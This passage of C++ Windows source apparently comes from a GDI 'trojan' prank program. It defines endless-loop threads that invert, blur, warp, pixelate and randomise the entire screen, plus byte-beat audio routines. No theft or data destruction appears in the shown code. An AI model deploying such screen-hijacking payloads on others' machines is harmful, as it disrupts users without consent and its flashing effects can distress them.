	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	while (1) {
		hdc = GetDC(NULL);
		BitBlt(hdc, -1, 1, w, h, hdc, 2, 2, SRCINVERT);
		BitBlt(hdc, 1, -1, w, h, hdc, -2, -2, SRCINVERT);
		ReleaseDC(0, hdc);
	}
	return 0;
}

DWORD WINAPI TransparentBlt1(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	COLORREF TransparentBltColor = (RGB(rand() % 255, rand() % 255, rand() % 255));
	while (1) {
		hdc = GetDC(0);
		TransparentBlt(hdc, rand() % 225, rand() % 225, sw, sh, hdc, rand() % 225, rand() % 225, rand() % 225, rand() % 225, TransparentBltColor);
		ReleaseDC(0, hdc);
	}
	return 0;
}

DWORD WINAPI octagon(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;

	while (1) {
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;

		int centerX = x + 50;
		int centerY = y + 50;
		int radius = 50;

		POINT octagonPoints[8];
		for (int i = 0; i < 8; ++i) {
			double angle = 2.0 * M_PI * i / 8;
			octagonPoints[i].x = centerX + static_cast<int>(radius * cos(angle));
			octagonPoints[i].y = centerY + static_cast<int>(radius * sin(angle));
		}

		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		Polygon(hdc, octagonPoints, 8);

		if (centerY >= GetSystemMetrics(SM_CYSCREEN)) {
			signY = -1;
		}
		if (centerX >= GetSystemMetrics(SM_CXSCREEN)) {
			signX = -1;
		}
		if (centerY <= 0) {
			signY = 1;
		}
		if (centerX <= 0) {
			signX = 1;
		}
		Sleep(1);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
	return 0;
}

DWORD WINAPI blur1(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	RECT rekt;
	POINT wPt[3];
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(hdc, &bmpi, 0, NULL, NULL, 0);
	SelectObject(hdcCopy, bmp);

	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;

	while (1) {
		hdc = GetDC(NULL);
		GetWindowRect(GetDesktopWindow(), &rekt);
		wPt[0].x = rand() % w; wPt[0].y = rand() % h;
		wPt[1].x = rand() % w; wPt[1].y = rand() % h;
		wPt[2].x = rand() % w; wPt[2].y = rand() % h;
		PlgBlt(hdcCopy, wPt, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
	}
	return 0x00;
}

DWORD WINAPI KF(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				int fx = (int)((i ^ 4) + (i * 4) * cbrt(x ^ y*i));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, -20, 0, screenWidth+40, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI i9gen12(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	RECT rekt;
	POINT wPt[3];
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	bmp = CreateDIBSection(hdc, &bmpi, 0, NULL, NULL, 0);
	SelectObject(hdcCopy, bmp);
	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;
	while (1) {
		hdc = GetDC(NULL);
		GetWindowRect(GetDesktopWindow(), &rekt);
		wPt[0].x = rekt.left - 10;
		wPt[0].y = rekt.top - 10;
		wPt[1].x = rekt.right + 10;
		wPt[1].y = rekt.top;
		wPt[2].x = rekt.left - 10;
		wPt[2].y = rekt.bottom + 10;
		PlgBlt(hdcCopy, wPt, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
	}
	return 0x00;
}

DWORD WINAPI IntelCorei9Gen12(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(SM_CXSCREEN);
		int y = GetSystemMetrics(SM_CYSCREEN);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_WINLOGO), (rand() % 10 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 10 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_ERROR), (rand() % 10 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 10 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_QUESTION), (rand() % 10 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 10 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_WARNING), (rand() % 10 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 10 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_INFORMATION), (rand() % 10 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 10 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
	return 0;
}

DWORD WINAPI pentagon(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;
		int centerX = x + 50;
		int centerY = y + 50;
		int radius = 50;
		POINT pentagonPoints[5];
		for (int i = 0; i < 5; ++i) {
			double angle = 2.0 * M_PI * i / 5;
			pentagonPoints[i].x = centerX + static_cast<int>(radius * cos(angle));
			pentagonPoints[i].y = centerY + static_cast<int>(radius * sin(angle));
		}
		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		Polygon(hdc, pentagonPoints, 5);
		if (centerY >= GetSystemMetrics(SM_CYSCREEN)) {
			signY = -1;
		}
		if (centerX >= GetSystemMetrics(SM_CXSCREEN)) {
			signX = -1;
		}
		if (centerY <= 0) {
			signY = 1;
		}
		if (centerX <= 0) {
			signX = 1;
		}
		Sleep(1);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
	return 0;
}

DWORD WINAPI kldfvkj(LPVOID lpParam) {
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	for (;;) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 60;
			BitBlt(hdc, 0, i, sw, 1, hdc, a, i, SRCCOPY);
			angle += M_PI / 70;
			DeleteObject(&a); DeleteObject(&i);
		}
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc); DeleteObject(wnd); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}

DWORD WINAPI efjegjherf(LPVOID lpvd) //credits to fr4ctalz, but pankoza modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * sqrt(i*x ^ y));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}

DWORD WINAPI LTSC(LPVOID lpvd) //credits to fr4ctalz, but pankoza modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * sqrt(RGB(5, 10, 15)));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}

DWORD WINAPI XdWindowsOS(LPVOID lpvd)
{
	//Credits to ArTicZera and Rekto
	HDC hdc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(dcCopy, bmp);

	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;

	while (1) {
		hdc = GetDC(NULL);
		BitBlt(dcCopy, 1, 1, w, h, hdc, -2, -2, SRCCOPY);
		AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
		//Sleep(rand() % 25);
		ReleaseDC(0, hdc);
	}
	return 0x00;
}

DWORD WINAPI idk(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;
                FLOAT fx = (x^y) + (i + i * 10);

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .10f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }

    return 0x00;
}

DWORD WINAPI pixelate(LPVOID lpvd)
{
    HDC hdc = GetDC(0);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(hdcCopy, bmp);

    while (1)
    {
        hdc = GetDC(0);
        SetStretchBltMode(hdcCopy, COLORONCOLOR);
        SetStretchBltMode(hdc, COLORONCOLOR);

        StretchBlt(hdcCopy, 0, 0, w / 9, h / 9, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w / 9, h / 9, SRCCOPY);

        ReleaseDC(0, hdc);
        Sleep(10);
    }

    return 0x00;
}

DWORD WINAPI IntelCorei912thGen(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    RGBQUAD* rgbScreen = NULL;
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, 0, 0);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgbBlue += x & y;
            // XOR operation on individual color components instead of .rgb
            rgbScreen[i].rgbRed ^= 360;
            rgbScreen[i].rgbGreen ^= 360;
            rgbScreen[i].rgbBlue ^= 360;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        Sleep(10);
        ReleaseDC(NULL, hdcScreen); 
        DeleteDC(hdcScreen);
    }
}

DWORD WINAPI cnd(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int fx = (int)((i ^ 4) + (i * 4) * cbrt(x | y));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

    return 0x00;
}

DWORD WINAPI cdvm(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    RECT rekt;
    POINT pt1[3];
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int counter = M_PI * M_PI * M_PI;
    int xSize = h;
    int ySize = w / 45;
    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(hdcCopy, bmp);

    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;

    while (1) {
        for (int i = 0; i < h / 3; i++) {
            hdc = GetDC(NULL);
            GetWindowRect(GetDesktopWindow(), &rekt);
            pt1[0].x = rekt.left + counter;
            pt1[0].y = rekt.top - sin(i / ((float)xSize) * M_PI) * (ySize);
            pt1[1].x = rekt.right + counter;
            pt1[1].y = rekt.top + counter;
            pt1[2].x = rekt.left - counter;
            pt1[2].y = rekt.bottom - counter;
            PlgBlt(hdcCopy, pt1, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
            AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
            ReleaseDC(0, hdc);
        }
    }
    return 0x00;
}

DWORD WINAPI last(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = rand();
		}
		BitBlt(hdcScreen, -2, 2, w, h, hdcMem, 4, 4, SRCERASE);
		Sleep(10);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
	return 0;
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(6+(((t>>18&1?t>>(t>>18&1?13:12)&3:0)^t>>(t>>18&1?14:13)&(-t>>(t>>18&1?15:14)&3?1:2))+3&3))/8%128+(t*(6+(t>>16&3))/16|t>>7^t>>9)%128);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t^t>>8)+t&128^t&t>>8&128);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((((t/10|0)^(t/10|0)-1280)%11*t/2&127)+(((t/640|0)^(t/640|0)-2)%13*t/2&127));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * t / (1 + (t >> 9 & t >> 8)) & 129);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t*(3+(4+(t>>12)%2)*(t>>10)%7)&128)*(.15+(t>>9)%2)/2);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 8 | t >> 9)) >> (t >> 19);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(15 * t & t * (t >> 10) / 6);
		
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 0) ^ (t >> 4) ^ (t >> 7));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
